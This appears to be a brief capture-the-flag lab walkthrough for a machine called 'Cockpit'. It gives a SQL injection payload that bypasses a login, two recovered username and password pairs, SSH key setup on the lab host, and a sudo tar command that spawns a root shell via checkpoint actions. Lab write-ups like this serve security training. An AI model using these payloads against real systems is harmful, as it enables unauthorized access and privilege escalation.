# Cockpit

We start off enumeration with nmap and see this:

<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

We quickly see a potenital SQLI and with this payload:

```
admin' UNION SELECT 1, 2,3,4,5 FROM information_schema.tables WHERE table_schema=database()#
```

We get access to this

<figure><img src="../../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

And get those credentials:

```
james  canttouchhhthiss@455152
cameron thisscanttbetouchedd@455152
```

The nmap revealed this page and we can now connect:

<figure><img src="../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

We can add public keys for out user

<figure><img src="../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

to generate my ssh key:

```
ssh-keygen -t rsa -b 4096 -f my_ssh_key
```

and to connect:

```
ssh -i my_ssh_key james@192.168.145.10
```

Then we sudo -l and see this:

<figure><img src="../../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

this gtfobins helps us:

{% embed url="https://gtfobins.github.io/gtfobins/tar/#sudo" %}

and the final payload is:

```
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

<figure><img src="../../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>
